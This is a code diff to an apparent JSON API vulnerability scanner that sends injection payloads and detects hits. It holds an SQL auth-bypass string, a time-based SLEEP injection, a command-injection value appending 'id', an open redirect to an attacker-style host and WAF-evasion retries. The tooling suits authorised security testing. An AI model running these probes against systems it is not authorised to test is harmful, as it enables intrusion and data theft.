@@ -49,6 +49,7 @@ BASE_DIR = TOOLS_DIR.parent
 try:
     from tools.auth_session import AuthSession, add_cli_args, session_from_args
     from tools.browser_surface import public_url_shape
+    from tools.sql_payloads import SQL_PAYLOADS
     from tools.target_paths import canonical_target_value, target_storage_key, url_belongs_to_target
     from tools.waf_encoder import base64_wrap_xss, tab_newline_space
     from tools.waf_response_analyzer import LogIDExtractor, ResponseFingerprint, WAFSignatureDB
@@ -56,6 +57,7 @@ except ImportError:  # pragma: no cover
     sys.path.insert(0, str(TOOLS_DIR))
     from auth_session import AuthSession, add_cli_args, session_from_args  # type: ignore
     from browser_surface import public_url_shape  # type: ignore
+    from sql_payloads import SQL_PAYLOADS  # type: ignore
     from target_paths import canonical_target_value, target_storage_key, url_belongs_to_target  # type: ignore
     from waf_encoder import base64_wrap_xss, tab_newline_space  # type: ignore
     from waf_response_analyzer import LogIDExtractor, ResponseFingerprint, WAFSignatureDB  # type: ignore
@@ -67,11 +69,8 @@ SUMMARY_ITEM_LIMIT = 100
 _WAF_DB = WAFSignatureDB()
 _WAF_LOG_IDS = LogIDExtractor(_WAF_DB)
 
-# Payload library (one per attack class — kept tight on purpose).
-PAYLOADS: list[dict] = [
-    {"class": "sqli_auth_bypass", "value": "' OR 1=1--", "field_hint": "email|user|login|name|account"},
-    {"class": "sqli_error", "value": "'", "field_hint": ".*"},
-    {"class": "sqli_time", "value": "1' AND SLEEP(5)-- -", "field_hint": ".*", "expect": "time>=4"},
+# Non-SQL JSON probes remain local; SQL families live in the shared catalog.
+_LEGACY_PAYLOADS: list[dict] = [
     {"class": "ssti", "value": "{{7*7}}", "field_hint": ".*"},
     {"class": "cmd_injection", "value": "127.0.0.1;id", "field_hint": "host|ip|target|server|url"},
     {"class": "open_redirect", "value": "https://evil.example.com", "field_hint": "url|redirect|return|next|to|callback"},
@@ -88,12 +87,20 @@ PAYLOADS: list[dict] = [
     {"class": "graphql_introspection", "value": "{ __schema { types { name } } }", "field_hint": "query|gql|graphql"},
 ]
 
+# Keep non-SQL JSON probes local while all SQL transports share one catalog.
+PAYLOADS: list[dict] = [
+    *SQL_PAYLOADS,
+    *[item for item in _LEGACY_PAYLOADS if not str(item.get("class", "")).startswith("sqli_")],
+]
+
 # Strong-signal regexes scanned in response bodies.
 JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
 ADMIN_ROLE_RE = re.compile(r'"role"\s*:\s*"(admin|root|superuser)"', re.I)
 SQL_ERROR_RE = re.compile(
-    r"SQLITE_ERROR|SQL syntax|sqlite3\.|ORA-\d+|mysqli?_\w+|PG::\w+|near \"[^\"]*\": syntax error|"
-    r"unterminated quoted string|Unclosed quotation mark",
+    r"SQLITE_ERROR|SQLiteException|SQL syntax|You have an error in your SQL syntax|sqlite3\.|"
+    r"ORA-\d+|mysqli?_\w+|PG::\w+|SQLSTATE\[\w+\]|XPATH syntax error|"
+    r"invalid input syntax for type|division by zero|Division by 0|near \"[^\"]*\": syntax error|"
+    r"unterminated quoted string|Unclosed quotation mark|ODBC SQL Server Driver|Microsoft OLE DB Provider",
     re.I,
 )
 SSTI_PROOF_RE = re.compile(r"\b49\b")
@@ -103,7 +110,26 @@ PATH_PROOF_RE = re.compile(r"root:[x*]:0:0:", re.I)
 # false-positive on a 404 page that happens to mention "__schema".
 GRAPHQL_INTROSPECTION_RE = re.compile(r'"__schema"\s*:\s*\{|"types"\s*:\s*\[\s*\{\s*"name"', re.I)
 # Class groups that share a detection signal.
-AUTH_BYPASS_CLASSES = ("sqli_auth_bypass", "nosql_op_injection", "nosql_regex_bypass")
+AUTH_BYPASS_CLASSES = (
+    "sqli_auth_bypass",
+    "sqli_boolean_true",
+    "sqli_boolean_false",
+    "nosql_op_injection",
+    "nosql_regex_bypass",
+)
+SQL_ERROR_CLASSES = (
+    "sqli_error",
+    "sqli_error_based",
+    "sqli_auth_bypass",
+    "sqli_boolean_true",
+    "sqli_boolean_false",
+    "sqli_boolean_blind",
+    "sqli_numeric",
+    "sqli_arithmetic",
+    "sqli_time",
+    "sqli_union",
+    "sqli_waf_bypass",
+)
 
 
 # ---------------------------------------------------------------------------
@@ -420,7 +446,14 @@ def _waf_variants(payload_class: str, payload_value: object) -> list[tuple[str, 
 # Probe logic
 
 
-def _detect_hit(payload_class: str, baseline: dict, response: dict, payload_value: str) -> dict:
+def _detect_hit(
+    payload_class: str,
+    baseline: dict,
+    response: dict,
+    payload_value: str,
+    *,
+    min_delay: float = 4.0,
+) -> dict:
     """Return {hit: bool, signal: str, evidence: str}."""
     out = {"hit": False, "signal": "", "evidence": ""}
     if (
@@ -446,14 +479,18 @@ def _detect_hit(payload_class: str, baseline: dict, response: dict, payload_valu
         return out
 
     # Strong signal B: SQL error fingerprint
-    if payload_class in ("sqli_error", "sqli_auth_bypass") and SQL_ERROR_RE.search(body):
+    if payload_class in SQL_ERROR_CLASSES and SQL_ERROR_RE.search(body):
         out["hit"] = True
         out["signal"] = "sql_error_fingerprint"
         out["evidence"] = SQL_ERROR_RE.search(body).group(0)[:120]
         return out
 
     # Strong signal C: time-based blind SQLi
-    if payload_class == "sqli_time" and response.get("latency", 0) >= 4.0 and baseline.get("latency", 0) < 2.0:
+    if (
+        payload_class == "sqli_time"
+        and response.get("latency", 0) >= min_delay
+        and baseline.get("latency", 0) < 2.0
+    ):
         out["hit"] = True
         out["signal"] = "sqli_time_delay"
         out["evidence"] = f"baseline={baseline['latency']:.2f}s probe={response['latency']:.2f}s"
@@ -533,6 +570,48 @@ def _field_eligible(field: str, payload: dict) -> bool:
     return bool(re.search(hint, field, re.I))
 
 
+def _response_shape(response: dict) -> tuple:
+    """Return a compact shape for boolean true/false comparison."""
+    body = str(response.get("body_text") or "")
+    try:
+        parsed = json.loads(body)
+    except (TypeError, json.JSONDecodeError):
+        return ("text", len(body))
+    if isinstance(parsed, dict):
+        return ("object", tuple(sorted(str(key) for key in parsed)))
+    if isinstance(parsed, list):
+        return ("array", len(parsed))
+    return (type(parsed).__name__, str(parsed)[:80])
+
+
+def _boolean_pair_detection(true_response: dict, false_response: dict) -> dict:
+    """Promote only a material true/false response difference."""
+    if (
+        true_response.get("error")
+        or false_response.get("error")
+        or int(true_response.get("status") or 0) <= 0
+        or int(false_response.get("status") or 0) <= 0
+    ):
+        return {"hit": False, "signal": "", "evidence": ""}
+    true_status = int(true_response.get("status") or 0)
+    false_status = int(false_response.get("status") or 0)
+    true_body = str(true_response.get("body_text") or "")
+    false_body = str(false_response.get("body_text") or "")
+    size_delta = abs(len(true_body.encode("utf-8")) - len(false_body.encode("utf-8")))
+    shape_changed = _response_shape(true_response) != _response_shape(false_response)
+    if true_status == false_status and size_delta < 32 and not shape_changed:
+        return {"hit": False, "signal": "", "evidence": ""}
+    return {
+        "hit": True,
+        "signal": "sqli_boolean_pair_difference",
+        "evidence": (
+            f"true_status={true_status} false_status={false_status}; "
+            f"body_delta={len(false_body.encode('utf-8')) - len(true_body.encode('utf-8'))}; "
+            f"shape_changed={'yes' if shape_changed else 'no'}"
+        ),
+    }
+
+
 def _send_json(
     url: str,
     body: dict,
@@ -544,6 +623,62 @@ def _send_json(
     if target or session is not None:
         return _http_post_json(url, body, timeout, target=target, session=session)
     return _http_post_json(url, body, timeout)
+
+
+def _payload_plan(payloads: list[dict] | None = None) -> list[dict]:
+    """Put one probe from every class ahead of deeper family variants."""
+    source = payloads if payloads is not None else PAYLOADS
+    first: list[dict] = []
+    rest: list[dict] = []
+    seen: set[str] = set()
+    for payload in source:
+        payload_class = str(payload.get("class") or "")
+        if payload_class not in seen:
+            seen.add(payload_class)
+            first.append(payload)
+        else:
+            rest.append(payload)
+    return first + rest
+
+
+def _payload_field_plan(
+    body_template: dict,
+    payloads: list[dict] | None = None,
+) -> list[tuple[dict, str]]:
+    """Schedule class representatives before field/variant expansion.
+
+    The request budget is per endpoint, not per field. Picking every field for
+    the first payload would therefore starve later classes on wide JSON
+    bodies. Reserve one eligible field for each class first, then fill the
+    remaining budget with the complete matrix.
+    """
+    string_fields = [
+        key for key, value in body_template.items()
+        if isinstance(value, (str, int)) or value is None
+    ]
+    ordered = _payload_plan(payloads)
+    representatives: list[tuple[dict, str]] = []
+    representative_keys: set[tuple[int, str]] = set()
+    seen_classes: set[str] = set()
+    for payload in ordered:
+        payload_class = str(payload.get("class") or "")
+        if payload_class in seen_classes:
+            continue
+        for field in string_fields:
+            if _field_eligible(field, payload):
+                representatives.append((payload, field))
+                representative_keys.add((id(payload), field))
+                seen_classes.add(payload_class)
+                break
+
+    remainder = [
+        (payload, field)
+        for payload in ordered
+        for field in string_fields
+        if _field_eligible(field, payload)
+        and (id(payload), field) not in representative_keys
+    ]
+    return representatives + remainder
 
 
 def _record_request(stats: dict | None, response: dict) -> None:
@@ -576,98 +711,127 @@ def probe_endpoint(
     request_count = 1
     hits: list[dict] = []
     waf_events: list[dict] = []
+    pair_responses: dict[tuple[str, str], dict[str, dict]] = {}
+    reported_pairs: set[tuple[str, str]] = set()
     if baseline.get("error") or int(baseline.get("status") or 0) <= 0:
         return hits, waf_events
 
-    string_fields = [k for k, v in body_template.items() if isinstance(v, (str, int)) or v is None]
-    for payload in PAYLOADS:
-        for field in string_fields:
-            if not _field_eligible(field, payload):
-                continue
+    for payload, field in _payload_field_plan(body_template):
+        if request_count >= max_requests:
+            return hits, waf_events
+        mutated = dict(body_template)
+        mutated[field] = payload["value"]
+        probe_timeout = 12.0 if payload["class"].startswith("sqli_time") else 8.0
+        resp = _send_json(
+            url,
+            mutated,
+            probe_timeout,
+            target=target,
+            session=session,
+        )
+        _record_request(stats, resp)
+        request_count += 1
+        waf = _waf_observation(baseline, resp)
+        if waf["outcome"] == "application_response":
+            pair_id = str(payload.get("pair_id") or "")
+            pair_side = str(payload.get("pair_side") or "")
+            pair_key = (field, pair_id)
+            pair_detection = {"hit": False, "signal": "", "evidence": ""}
+            if pair_id and pair_side in {"true", "false"}:
+                pair_responses.setdefault(pair_key, {})[pair_side] = resp
+                pair = pair_responses[pair_key]
+                if pair_key not in reported_pairs and {"true", "false"}.issubset(pair):
+                    pair_detection = _boolean_pair_detection(pair["true"], pair["false"])
+                    if pair_detection["hit"]:
+                        reported_pairs.add(pair_key)
+            detection = pair_detection if pair_detection["hit"] else _detect_hit(
+                payload["class"],
+                baseline,
+                resp,
+                payload["value"],
+                min_delay=float(payload.get("min_delay", 4.0) or 4.0),
+            )
+            if detection["hit"]:
+                hits.append({
+                    "url": url,
+                    "method": "POST",
+                    "field": field,
+                    "payload_class": "sqli_boolean_pair" if pair_detection["hit"] else payload["class"],
+                    "payload_value": payload["value"],
+                    "payload_family": payload.get("family", payload["class"]),
+                    **({"dbms": payload["dbms"]} if payload.get("dbms") else {}),
+                    **({"pair_id": pair_id} if pair_detection["hit"] else {}),
+                    "signal": detection["signal"],
+                    "evidence": detection["evidence"],
+                    "response_status": resp["status"],
+                    "response_size": resp["body_size"],
+                    "response_excerpt": resp["body_text"][:280],
+                    "curl": _curl_reproducer(url, mutated),
+                })
+            continue
+        if not waf["blocked"]:
+            continue
+        waf_events.append({
+            "url": url,
+            "field": field,
+            "payload_class": payload["class"],
+            "payload_family": payload.get("family", payload["class"]),
+            "technique": "canonical",
+            **waf,
+        })
+        for technique, variant in _waf_variants(payload["class"], payload["value"]):
             if request_count >= max_requests:
                 return hits, waf_events
             mutated = dict(body_template)
-            mutated[field] = payload["value"]
-            resp = _send_json(
+            mutated[field] = variant
+            retry = _send_json(
                 url,
                 mutated,
-                12.0 if payload["class"] == "sqli_time" else 8.0,
+                probe_timeout,
                 target=target,
                 session=session,
             )
-            _record_request(stats, resp)
+            _record_request(stats, retry)
             request_count += 1
-            waf = _waf_observation(baseline, resp)
-            if waf["outcome"] == "application_response":
-                detection = _detect_hit(payload["class"], baseline, resp, payload["value"])
-                if detection["hit"]:
-                    hits.append({
-                        "url": url,
-                        "method": "POST",
-                        "field": field,
-                        "payload_class": payload["class"],
-                        "payload_value": payload["value"],
-                        "signal": detection["signal"],
-                        "evidence": detection["evidence"],
-                        "response_status": resp["status"],
-                        "response_size": resp["body_size"],
-                        "response_excerpt": resp["body_text"][:280],
-                        "curl": _curl_reproducer(url, mutated),
-                    })
-                continue
-            if not waf["blocked"]:
-                continue
+            retry_waf = _waf_observation(baseline, retry)
             waf_events.append({
                 "url": url,
                 "field": field,
                 "payload_class": payload["class"],
-                "technique": "canonical",
-                **waf,
+                "payload_family": payload.get("family", payload["class"]),
+                "technique": technique,
+                **retry_waf,
             })
-            for technique, variant in _waf_variants(payload["class"], payload["value"]):
-                if request_count >= max_requests:
-                    return hits, waf_events
-                mutated = dict(body_template)
-                mutated[field] = variant
-                retry = _send_json(
-                    url,
-                    mutated,
-                    12.0 if payload["class"] == "sqli_time" else 8.0,
-                    target=target,
-                    session=session,
-                )
-                _record_request(stats, retry)
-                request_count += 1
-                retry_waf = _waf_observation(baseline, retry)
-                waf_events.append({
+            if retry_waf["outcome"] in {"transport_error", "rate_limited"}:
+                break
+            if retry_waf["blocked"]:
+                continue
+            detection = _detect_hit(
+                payload["class"],
+                baseline,
+                retry,
+                variant,
+                min_delay=float(payload.get("min_delay", 4.0) or 4.0),
+            )
+            if detection["hit"]:
+                hits.append({
                     "url": url,
+                    "method": "POST",
                     "field": field,
                     "payload_class": payload["class"],
-                    "technique": technique,
-                    **retry_waf,
+                    "payload_value": variant,
+                    "payload_family": payload.get("family", payload["class"]),
+                    **({"dbms": payload["dbms"]} if payload.get("dbms") else {}),
+                    "waf_variant": technique,
+                    "signal": detection["signal"],
+                    "evidence": detection["evidence"],
+                    "response_status": retry["status"],
+                    "response_size": retry["body_size"],
+                    "response_excerpt": retry["body_text"][:280],
+                    "curl": _curl_reproducer(url, mutated),
                 })
-                if retry_waf["outcome"] in {"transport_error", "rate_limited"}:
-                    break
-                if retry_waf["blocked"]:
-                    continue
-                detection = _detect_hit(payload["class"], baseline, retry, variant)
-                if detection["hit"]:
-                    hits.append({
-                        "url": url,
-                        "method": "POST",
-                        "field": field,
-                        "payload_class": payload["class"],
-                        "payload_value": variant,
-                        "waf_variant": technique,
-                        "signal": detection["signal"],
-                        "evidence": detection["evidence"],
-                        "response_status": retry["status"],
-                        "response_size": retry["body_size"],
-                        "response_excerpt": retry["body_text"][:280],
-                        "curl": _curl_reproducer(url, mutated),
-                    })
-                    break
                 break
+            break
     return hits, waf_events
 
 
